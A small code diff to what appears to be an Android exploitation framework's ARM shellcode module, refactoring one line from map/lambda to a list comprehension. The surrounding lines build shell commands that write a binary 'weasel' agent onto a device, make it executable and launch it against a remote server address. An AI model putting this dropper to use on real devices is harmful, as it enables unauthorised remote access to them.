@@ -57,7 +57,7 @@ class ARMEABI(Module, common.ShellCode):
         
         self.append(self.hexifyString("cd %s\n" % directory))
         self.append(self.hexifyString("/system/bin/rm w\n"))
-        self.append(self.hexifyString("echo -e \"%s\" > w\n" % "".join(map(lambda b: "\\0%.3o" % ord(b), fs.read(weasel)))))
+        self.append(self.hexifyString("echo -e \"%s\" > w\n" % "".join(["\\0%.3o" % ord(b) for b in fs.read(weasel)])))
         self.append(self.hexifyString("/system/bin/chmod 770 w\n"))
         self.append(self.hexifyString("./w %s %d\n" % arguments.server))
         
